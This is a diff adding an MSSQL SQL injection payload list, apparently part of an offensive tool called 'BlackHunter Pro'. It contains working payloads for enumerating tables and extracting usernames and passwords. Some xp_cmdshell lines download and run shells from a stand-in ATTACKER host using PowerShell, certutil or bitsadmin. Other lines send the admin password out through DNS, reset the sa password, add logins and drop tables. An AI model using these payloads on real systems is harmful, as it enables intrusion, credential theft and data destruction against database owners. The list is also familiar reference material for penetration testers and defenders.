@@ -1,0 +1,200 @@
+# payloads/sqli/mssql.txt
+# MSSQL-Specific SQL Injection Payloads
+# BlackHunter Pro
+
+# =============================================
+# VERSION DETECTION
+# =============================================
+
+' UNION SELECT @@version--
+' UNION SELECT @@VERSION--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=@@version--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST(@@version AS int)--
+' UNION SELECT SERVERPROPERTY('productversion')--
+' UNION SELECT SERVERPROPERTY('edition')--
+' UNION SELECT SERVERPROPERTY('servername')--
+
+# =============================================
+# DATABASE INFO
+# =============================================
+
+' UNION SELECT DB_NAME()--
+' UNION SELECT DB_NAME(1)--
+' UNION SELECT DB_NAME(2)--
+' UNION SELECT name FROM master..sysdatabases--
+' UNION SELECT SUSER_SNAME()--
+' UNION SELECT USER_NAME()--
+' UNION SELECT SYSTEM_USER--
+' UNION SELECT CURRENT_USER--
+' UNION SELECT @@SERVERNAME--
+' UNION SELECT HOST_NAME()--
+' UNION SELECT @@SPID--
+' UNION SELECT @@VERSION--
+' UNION SELECT ORIGINAL_LOGIN()--
+' UNION SELECT SESSION_USER--
+' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--
+
+# =============================================
+# TABLE ENUMERATION
+# =============================================
+
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT name FROM sys.tables--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+' UNION SELECT GROUP_CONCAT(name) FROM sysobjects WHERE xtype='U'--
+' UNION SELECT name FROM sysobjects WHERE xtype='U' AND name NOT IN ('sysdiagrams')--
+' UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
+' UNION SELECT name FROM sysobjects WHERE xtype='U' ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int,(SELECT name FROM sysobjects WHERE xtype='U' FOR XML PATH('')))--
+
+# =============================================
+# COLUMN ENUMERATION
+# =============================================
+
+' UNION SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--
+' UNION SELECT GROUP_CONCAT(name) FROM syscolumns WHERE id=OBJECT_ID('users')--
+' UNION SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('users')--
+' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('users')))--
+
+# =============================================
+# DATA EXTRACTION
+# =============================================
+
+' UNION SELECT username FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT username+':'+password FROM users--
+' UNION SELECT TOP 1 username FROM users--
+' UNION SELECT TOP 1 password FROM users--
+' UNION SELECT TOP 1 username+':'+password FROM users--
+' UNION SELECT username FROM users ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY--
+' UNION SELECT username FROM users ORDER BY 1 OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY--
+' UNION SELECT username FROM users FOR XML PATH('')--
+' UNION SELECT username+':'+password FROM users FOR XML PATH('')--
+' UNION SELECT STUFF((SELECT ','+username FROM users FOR XML PATH('')),1,1,'')--
+' UNION SELECT STRING_AGG(username, ',') FROM users--
+' UNION SELECT STRING_AGG(username+':'+password, ',') FROM users--
+' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+' AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))--
+
+# =============================================
+# ERROR-BASED EXTRACTION
+# =============================================
+
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,DB_NAME())--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
+' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+' AND 1=CAST(@@version AS int)--
+' AND 1=CAST((SELECT TOP 1 password FROM users) AS int)--
+' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int)--
+' AND 1=CONVERT(int,(SELECT TOP 1 username+':'+password FROM users))--
+
+# =============================================
+# TIME-BASED
+# =============================================
+
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'-- -
+' IF 1=1 WAITFOR DELAY '0:0:5'--
+' IF 1=2 WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+1); WAITFOR DELAY '0:0:5'--
+1)); WAITFOR DELAY '0:0:5'--
+' AND 1=1; WAITFOR DELAY '0:0:5'--
+' AND 1=2; WAITFOR DELAY '0:0:5'--
+'; WAITFOR TIME '00:00:05'--
+' IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--
+' IF (SELECT COUNT(*) FROM users)=0 WAITFOR DELAY '0:0:5'--
+' IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--
+' IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b' WAITFOR DELAY '0:0:5'--
+
+# =============================================
+# COMMAND EXECUTION
+# =============================================
+
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'whoami'-- -
+'; EXEC xp_cmdshell 'ipconfig'--
+'; EXEC xp_cmdshell 'dir'--
+'; EXEC xp_cmdshell 'net user'--
+'; EXEC xp_cmdshell 'net localgroup administrators'--
+'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC master..xp_cmdshell 'powershell -c IEX(IWR http://ATTACKER/shell.ps1)'--
+'; EXEC master..xp_cmdshell 'powershell -c "IWR http://ATTACKER/shell.ps1 -OutFile C:\shell.ps1"'--
+'; EXEC master..xp_cmdshell 'certutil -urlcache -f http://ATTACKER/shell.exe C:\shell.exe'--
+'; EXEC master..xp_cmdshell 'bitsadmin /transfer job http://ATTACKER/shell.exe C:\shell.exe'--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+
+# =============================================
+# OOB (OUT-OF-BAND) VIA DNS/HTTP
+# =============================================
+
+'; EXEC master..xp_dirtree '//ATTACKER/x'--
+'; EXEC master..xp_fileexist '\\ATTACKER\x'--
+'; DECLARE @q VARCHAR(200); SET @q='\\ATTACKER\x'; EXEC master..xp_dirtree @q;--
+'; EXEC master..xp_subdirs '\\ATTACKER\x'--
+'; EXEC master..xp_dirtree '\\ATTACKER\share'--
+'; EXEC master..xp_fileexist '\\ATTACKER\share'--
+'; DECLARE @q VARCHAR(200); SET @q='\\'+(SELECT password FROM users WHERE username='admin')+'.ATTACKER\x'; EXEC master..xp_dirtree @q;--
+'; DECLARE @q VARCHAR(200); SET @q='\\'+(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')+'.ATTACKER\x'; EXEC master..xp_dirtree @q;--
+
+# =============================================
+# FILE OPERATIONS
+# =============================================
+
+' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x--
+' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\boot.ini', SINGLE_CLOB) AS x--
+' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x--
+' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
+
+# =============================================
+# STACKED QUERIES
+# =============================================
+
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; INSERT INTO users VALUES('hacker','password')--
+'; DELETE FROM users WHERE username='admin'--
+'; DROP TABLE users--
+'; CREATE TABLE shell(cmd text)--
+'; INSERT INTO shell VALUES('whoami')--
+
+# =============================================
+# PRIVILEGE ESCALATION
+# =============================================
+
+'; EXEC sp_addsrvrolemember 'user', 'sysadmin'--
+'; EXEC sp_addsrvrolemember 'user', 'db_owner'--
+'; EXEC sp_addlogin 'hacker', 'password'--
+'; EXEC sp_password NULL, 'newpassword', 'sa'--
+' UNION SELECT IS_SRVROLEMEMBER('sysadmin')--
+' UNION SELECT IS_SRVROLEMEMBER('db_owner')--
+' UNION SELECT IS_MEMBER('db_owner')--
+' UNION SELECT IS_MEMBER('sysadmin')--
+' UNION SELECT HAS_DBACCESS('master')--
+
+# =============================================
+# WAF BYPASS
+# =============================================
+
+' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+' UN/**/ION SEL/**/ECT NULL--
+' UNION%20SELECT%20NULL--
+' %55NION %53ELECT NULL--
+' UNION SELECT/**/NULL--
+' EXEC/**/xp_cmdshell/**/'whoami'--
+' EXEC%09xp_cmdshell%09'whoami'--
+' EXEC%0Axp_cmdshell%0A'whoami'--
+';EXEC/**/xp_cmdshell/**/'whoami'--
